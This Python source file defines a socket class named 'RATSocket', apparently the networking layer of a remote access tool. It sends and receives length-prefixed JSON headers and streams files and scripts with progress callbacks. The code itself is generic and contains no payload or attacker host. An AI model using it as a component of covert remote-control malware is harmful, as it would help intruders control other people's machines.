import json
import socket
import struct


class RATSocket:

    def __init__(self):
        self.socket = socket.socket()

    def connect(self, address):
        return self.socket.connect_ex(address) == 0

    def bind(self, address):
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind(address)
        self.socket.listen(5)

    def accept(self, connection_handler):
        while True:
            connection_handler(*self.socket.accept())

    def close(self):
        self.socket.close()

    def send(self, head, bytes=None, file_stream=None, update_progress=None):
        head_bytes = json.dumps(head).encode()
        if head['type'] in ['file', 'script']:
            self.socket.send(struct.pack('i', len(head_bytes)) + head_bytes)
            bytes_read = 0
            buffer_size = self.socket.getsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF)
            while 1:
                data = file_stream.read(buffer_size)
                if not data:
                    break
                self.socket.send(data)
                bytes_read += len(data)
                if update_progress:
                    update_progress(bytes_read, head['length'])
            file_stream.close()
        else:
            self.socket.send(struct.pack('i', len(head_bytes)) + head_bytes + bytes)

    def recv_head(self):
        head_len = self.socket.recv(4)
        if not head_len:
            raise socket.error('Receiving failure')
        head_len = struct.unpack('i', head_len)[0]
        return json.loads((self.socket.recv(head_len).decode()))

    def recv_body(self, head, file_stream=None, update_progress=None):
        length = head['length']
        if head['type'] == 'file':
            bytes_left = length
            while bytes_left:
                buf = self.socket.recv(bytes_left)
                if not buf:
                    raise socket.error('Connection aborted')
                bytes_left -= len(buf)
                if update_progress:
                    update_progress(length - bytes_left, length)
                file_stream.write(buf)
            file_stream.close()
        else:
            body = b''
            while length:
                buf = self.socket.recv(length)
                if not buf:
                    raise socket.error('Connection aborted')
                length -= len(buf)
                body += buf
            return body.decode()

    def recv(self):
        return self.recv_body(self.recv_head())
